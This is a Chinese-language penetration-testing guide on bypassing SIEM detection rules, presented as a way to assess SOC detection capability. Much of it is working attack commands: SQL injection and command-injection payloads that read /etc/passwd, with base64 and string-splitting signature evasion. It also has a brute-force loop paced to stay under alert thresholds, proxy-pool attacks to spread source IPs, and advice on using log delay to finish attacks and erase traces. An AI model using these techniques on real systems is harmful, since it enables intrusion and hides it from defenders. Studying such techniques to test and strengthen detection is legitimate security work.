# SIEM 规则绕过 (SIEM Rule Bypass)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供 SIEM 规则绕过的系统化方法论，帮助测试人员评估目标系统 SIEM 检测规则的有效性，发现可绕过的检测逻辑。

### 1.2 适用范围
本文档适用于以下场景：
- SIEM 检测能力评估
- 安全运营中心（SOC）有效性测试
- 威胁检测规则验证
- 红队演练中的隐蔽行动

### 1.3 读者对象
- 渗透测试工程师
- 红队成员
- 安全运营分析师
- 威胁检测工程师

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

SIEM（Security Information and Event Management）规则绕过是指攻击者通过各种技术规避 SIEM 系统的检测规则，使攻击行为不触发告警。

**核心原理：**
- **阈值绕过**：将攻击行为分散到多个时间窗口，避免触发频率阈值
- **规则盲点利用**：利用检测规则未覆盖的攻击技术
- **日志源规避**：针对 SIEM 未收集或延迟收集的日志源进行攻击
- **上下文缺失利用**：利用 SIEM 缺乏业务上下文导致的误判

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **SIEM 检测类型** | **绕过机会** |
| :--- | :--- | :--- |
| **认证系统** | 暴力破解检测 | 低频慢速攻击 |
| **数据访问** | 异常数据量检测 | 数据量阈值下攻击 |
| **权限变更** | 特权提升检测 | 利用合法变更流程 |
| **网络扫描** | 端口扫描检测 | 慢速扫描 |
| **恶意软件** | 签名检测 | 无文件攻击、LOLBins |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**SIEM 检测能力探测：**
```bash
# 1. 触发已知攻击模式，观察是否被检测
# SQL 注入探测
curl "http://target/api/user?id=1' OR '1'='1"

# 等待并观察：
# - 是否被阻断
# - 是否返回异常响应
# - 后续请求是否被限制

# 2. 测试检测延迟
start=$(date +%s)
curl "http://target/api/sensitive"
# 记录从请求到被检测的时间
```

**阈值探测：**
```bash
# 探测登录失败阈值
for i in {1..20}; do
    curl -X POST "http://target/login" \
         -d "username=admin&password=wrong$i"
    echo "Attempt $i completed"
    sleep 2
done
# 观察在第几次尝试后被锁定或告警

# 探测请求频率限制
for i in {1..100}; do
    curl "http://target/api/data"
    sleep 0.5
done
```

**规则盲点探测：**
```bash
# 测试非常规攻击向量
# 1. HTTP 方法绕过
curl -X PATCH "http://target/api/admin"
curl -X OPTIONS "http://target/api/admin"

# 2. 内容类型绕过
curl -H "Content-Type: text/plain" \
     -d "SELECT * FROM users" \
     "http://target/api/query"

# 3. 编码绕过
curl "http://target/api/exec?cmd=cat%20/etc/passwd"
```

#### 2.3.2 白盒测试

**SIEM 规则审计：**
```yaml
# Splunk 规则示例
# 危险：仅检测特定模式
index=web sourcetype=access_log
| search "SELECT * FROM" OR "UNION SELECT"
# 绕过：使用小写或编码

# 危险：固定时间窗口
index=auth sourcetype=auth_log
| stats count by src_ip window=5m
| where count > 10
# 绕过：将攻击分散到 5 分钟以上
```

```sql
-- SQL 规则示例
-- 危险：仅检测已知恶意 IP
SELECT * FROM logs 
WHERE src_ip IN ('1.2.3.4', '5.6.7.8')
-- 绕过：使用其他 IP

-- 危险：简单关键词匹配
SELECT * FROM logs 
WHERE request LIKE '%<script>%'
-- 绕过：使用编码或变体
```

### 2.4 漏洞利用方法

#### 2.4.1 阈值绕过

**低频慢速攻击：**
```bash
# 暴力破解阈值绕过
# 假设阈值为 10 次/5 分钟

# 策略：每 6 分钟尝试 5 次
while true; do
    for i in {1..5}; do
        curl -X POST "http://target/login" \
             -d "username=admin&password=pass$i"
        sleep 30
    done
    sleep 300  # 等待 5 分钟重置窗口
done
```

**分布式攻击：**
```bash
# 使用多个 IP 源分散攻击
# 通过代理池
for ip in $(cat proxy_list.txt); do
    curl -x "$ip" "http://target/api/sensitive" &
done

# 每个 IP 只发送少量请求
# 避免单个 IP 触发阈值
```

#### 2.4.2 规则盲点利用

**HTTP 参数污染：**
```bash
# 如果 SIEM 检测单个参数
# 将 payload 分散到多个参数
curl "http://target/search?p1=SELECT&p2=*p3=FROM&p4=users"

# 使用数组参数
curl "http://target/api?q[]=SELECT&q[]=*q[]=FROM"
```

**协议层绕过：**
```bash
# HTTP/2 特性利用
# 某些 SIEM 对 HTTP/2 解析不完善

# 使用 HTTP/2 发送恶意请求
curl --http2 "http://target/api/exploit"

# 利用头部压缩
# 某些 SIEM 无法正确解码 HPACK 压缩的头部
```

#### 2.4.3 日志源规避

**未监控日志源利用：**
```bash
# 识别 SIEM 未收集的日志源
# 1. 检查应用日志配置
# 2. 查找未转发到 SIEM 的日志

# 常见未监控日志源：
# - 开发/调试日志
# - 第三方组件日志
# - 临时文件日志
# - 内存日志

# 针对未监控日志源进行攻击
```

**日志延迟利用：**
```bash
# 利用日志收集延迟
# 1. 发送攻击请求
# 2. 在日志到达 SIEM 前完成攻击
# 3. 清理痕迹

# 典型日志延迟：几秒到几分钟
# 在这个时间窗口内完成敏感操作
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过签名检测

```bash
# 原始 payload（会被检测）
curl "http://target?cmd=cat /etc/passwd"

# 绕过技术 1：Base64 编码
curl "http://target?cmd=$(echo 'cat /etc/passwd' | base64)"
# 目标端解码执行

# 绕过技术 2：字符拼接
curl "http://target?cmd=c''at /etc/passwd"
curl "http://target?cmd=ca\$@t /etc/passwd"

# 绕过技术 3：使用替代命令
curl "http://target?cmd=more /etc/passwd"
curl "http://target?cmd=< /etc/passwd"
```

#### 2.5.2 绕过行为分析

```bash
# 模拟正常用户行为模式

# 1. 工作时间攻击
# 只在工作时间（9:00-18:00）进行攻击

# 2. 地理定位匹配
# 使用与正常用户相同的地理位置的代理

# 3. 设备指纹模仿
curl -A "Mozilla/5.0..." \
     -H "Accept: text/html,application/xhtml+xml" \
     -H "Accept-Language: en-US,en;q=0.9" \
     "http://target/api/exploit"
```

#### 2.5.3 关联规则绕过

```bash
# SIEM 关联规则通常检测攻击链
# 绕过策略：打断攻击链

# 传统攻击链：
# 1. 扫描 -> 2. 利用 -> 3. 后渗透

# 绕过方式：
# - 手动扫描，不使用自动化工具
# - 利用合法凭证进行后渗透
# - 将攻击阶段分散到不同会话
```

---

## 第三部分：附录

### 3.1 SIEM 规则绕过技术清单

| **技术** | **描述** | **检测难度** |
| :--- | :--- | :--- |
| 低频慢速攻击 | 将攻击分散到长时间窗口 | 中 |
| 分布式攻击 | 使用多个源 IP 分散攻击 | 高 |
| 协议层绕过 | 利用协议特性规避解析 | 中 |
| 编码绕过 | 对 payload 进行编码 | 低 |
| 合法凭证滥用 | 使用窃取的合法凭证 | 高 |
| 无文件攻击 | 不落地文件的攻击 | 高 |

### 3.2 SIEM 检测能力测试清单

- [ ] 测试暴力破解检测
- [ ] 测试 SQL 注入检测
- [ ] 测试 XSS 检测
- [ ] 测试命令注入检测
- [ ] 测试文件包含检测
- [ ] 测试异常行为检测
- [ ] 测试横向移动检测
- [ ] 测试数据外传检测

### 3.3 参考资源

- [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [SANS SIEM Testing Guide](https://www.sans.org/)
- [NIST 800-137 Continuous Monitoring](https://csrc.nist.gov/publications/detail/sp/800-137/final)
